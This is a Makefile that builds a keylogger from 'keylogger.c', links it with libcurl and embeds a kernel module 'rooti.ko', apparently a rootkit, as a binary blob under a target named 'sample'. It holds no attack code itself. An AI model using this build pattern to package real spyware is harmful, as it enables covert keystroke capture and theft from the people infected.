CC=gcc
CFLAGS=-Wall -Werror
LIBS=-lcurl

BUILD_DIR=bin
SOURCE=keylogger.c
TARGET_OBJ=$(BUILD_DIR)/keylogger.o
TARGET_ELF=$(BUILD_DIR)/keylogger

KMOD_PATH=rooti.ko
KMOD_EMBEDDED_TARGET_OBJ = $(BUILD_DIR)/kmod_blob.o

sample: $(TARGET_OBJ) $(KMOD_EMBEDDED_TARGET_OBJ)
	$(CC) -o $(TARGET_ELF) $(LDFLAGS) $^ $(LIBS)

$(KMOD_EMBEDDED_TARGET_OBJ):
	$(LD) -z noexecstack -r -b binary -o $(KMOD_EMBEDDED_TARGET_OBJ) $(KMOD_PATH)

$(TARGET_OBJ): $(SOURCE) | $(BUILD_DIR)
	$(CC) -c $(CFLAGS) -o $@ $<

$(BUILD_DIR):
	mkdir $(BUILD_DIR)

clean:
	rm -rf $(BUILD_DIR)

.PHONY: clean
